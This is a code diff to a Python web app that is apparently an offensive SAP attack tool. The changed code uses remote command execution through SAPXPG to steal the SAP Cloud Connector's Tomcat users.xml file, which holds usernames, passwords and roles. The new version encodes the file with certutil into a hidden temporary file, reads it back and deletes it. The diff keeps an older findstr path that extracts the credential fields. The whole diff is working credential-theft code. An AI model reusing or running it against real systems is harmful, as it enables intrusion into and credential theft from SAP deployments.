@@ -2010,50 +2010,75 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     # the username and password attributes directly —
                     # no PowerShell XML parsing, no quoting issues.
                     # Each attribute is on its own short output line.
-                    findstr_out, _ = _gw(
-                        "cmd.exe",
-                        f"/c findstr /i \"username= password= roles=\" \"{fpath}\"")
-                    print(f"[*] SCC {host}: findstr → "
-                          f"{len(findstr_out)}B out={findstr_out[:120]!r}")
-                    # Parse every <user .../> element from the output.
-                    # Tomcat saves users.xml as a single long line with all
-                    # <user> elements concatenated, so iterate by element
-                    # (re.finditer) rather than by line / re.search — the
-                    # latter only catches the first match.  Attribute order
-                    # also varies (some installs emit roles/groups before
-                    # username), so we extract attrs name-keyed instead of
-                    # positionally.
+                    # Read the file via certutil base64 instead of findstr.
+                    # SAPXPG truncates each output line at ~128 bytes — Tomcat
+                    # saves users.xml as one long line with every <user>
+                    # element concatenated, so a findstr match returns the
+                    # whole line and SAPXPG drops everything past the first
+                    # ~128 chars (i.e. the first user).  certutil -encode
+                    # naturally wraps base64 at 64 chars per line, so the
+                    # full content survives reassembly on the Python side.
                     import re as _re2
+                    import base64 as _b64e
                     raw = None
-                    xml_parts = [
-                        b'<?xml version="1.0" encoding="utf-8"?>',
-                        b'<tomcat-users>',
-                    ]
-                    found_users = 0
-                    user_re = _re2.compile(r'<user\b([^/>]*)/?\s*>',
-                                            _re2.IGNORECASE)
-                    attr_re = _re2.compile(r'(\w+)\s*=\s*["\']([^"\']*)["\']',
-                                            _re2.IGNORECASE)
-                    for m in user_re.finditer(findstr_out):
-                        attrs = {k.lower(): v
-                                  for k, v in attr_re.findall(m.group(1))}
-                        uname = attrs.get("username", "")
-                        pwd   = attrs.get("password", "")
-                        roles = attrs.get("roles", "")
-                        if uname:
-                            xml_parts.append(
-                                f'  <user username="{uname}" '
-                                f'password="{pwd}" '
-                                f'roles="{roles}"/>'.encode())
-                            found_users += 1
-                    xml_parts.append(b'</tomcat-users>')
-                    if found_users > 0:
-                        raw = b"\n".join(xml_parts)
-                        print(f"[*] SCC {host}: parsed {found_users} "
-                              f"user(s) from findstr output")
-                    else:
-                        print(f"[-] SCC {host}: findstr found no user "
-                              f"attributes in output")
+                    tmp = r"C:\Windows\Temp\.scc_users.b64"
+                    _gw("cmd.exe",
+                         f'/c certutil -encode "{fpath}" "{tmp}" 2>nul')
+                    cu_out, _ = _gw("cmd.exe", f'/c more "{tmp}"')
+                    _gw("cmd.exe", f'/c del /q "{tmp}" 2>nul')
+                    # Strip BEGIN/END CERTIFICATE markers and any non-base64
+                    # noise; certutil's output is wrapped in PEM-style banners.
+                    b64_text = "".join(
+                        _re2.findall(r'[A-Za-z0-9+/=]+', cu_out))
+                    print(f"[*] SCC {host}: certutil base64 → "
+                          f"{len(cu_out)}B, {len(b64_text)} b64 chars")
+                    if b64_text:
+                        try:
+                            raw = _b64e.b64decode(b64_text)
+                            print(f"[*] SCC {host}: decoded users.xml "
+                                  f"({len(raw)} bytes)")
+                        except Exception as _de:
+                            print(f"[-] SCC {host}: base64 decode failed: {_de}")
+                            raw = None
+                    if not raw:
+                        print(f"[-] SCC {host}: certutil read returned no data — "
+                              f"falling back to findstr (limited to 1st user)")
+                        # Last-ditch fallback for cases where certutil isn't
+                        # present.  Retains the multi-element parsing so if
+                        # SAPXPG happens NOT to truncate (e.g. tiny files),
+                        # we still extract every <user> element.
+                        findstr_out, _ = _gw(
+                            "cmd.exe",
+                            f'/c findstr /i "username= password= roles=" "{fpath}"')
+                        print(f"[*] SCC {host}: findstr fallback → "
+                              f"{len(findstr_out)}B out={findstr_out[:120]!r}")
+                        xml_parts = [
+                            b'<?xml version="1.0" encoding="utf-8"?>',
+                            b'<tomcat-users>',
+                        ]
+                        found_users = 0
+                        user_re = _re2.compile(r'<user\b([^/>]*)/?\s*>',
+                                                _re2.IGNORECASE)
+                        attr_re = _re2.compile(
+                            r'(\w+)\s*=\s*["\']([^"\']*)["\']',
+                            _re2.IGNORECASE)
+                        for m in user_re.finditer(findstr_out):
+                            attrs = {k.lower(): v
+                                      for k, v in attr_re.findall(m.group(1))}
+                            uname = attrs.get("username", "")
+                            pwd   = attrs.get("password", "")
+                            roles = attrs.get("roles", "")
+                            if uname:
+                                xml_parts.append(
+                                    f'  <user username="{uname}" '
+                                    f'password="{pwd}" '
+                                    f'roles="{roles}"/>'.encode())
+                                found_users += 1
+                        xml_parts.append(b'</tomcat-users>')
+                        if found_users > 0:
+                            raw = b"\n".join(xml_parts)
+                            print(f"[*] SCC {host}: findstr-fallback parsed "
+                                  f"{found_users} user(s)")
                 else:
                     linux_roots = [
                         "/opt/sap/scc",
